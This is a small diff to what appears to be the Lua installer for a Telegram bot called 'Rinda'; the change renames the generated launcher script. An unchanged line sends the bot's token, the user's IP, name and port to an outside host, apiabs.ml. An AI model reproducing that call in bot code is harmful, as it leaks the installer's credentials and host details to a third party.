@@ -78,7 +78,7 @@ SudoIds = {DevRio:get(Server.."IdRinda")},
 }
 Create(Config, "./config.lua") 
 https.request("https://apiabs.ml/Api/David/index.php?Get=David&DevId="..DevRio:get(Server.."IdRinda").."&TokenBot="..DevRio:get(Server.."TokenRinda").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-file = io.open("Rinda-Fatime.sh", "w")  
+file = io.open("Rinda.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/Rinda
@@ -108,7 +108,7 @@ cd $HOME/Rinda
 while(true) do
 rm -fr ../.telegram-cli
 screen -S Rinda -X kill
-screen -S Rinda ./Rinda-Fatime.sh
+screen -S Rinda ./Rinda.sh
 done
 ]]) 
 file:close() 
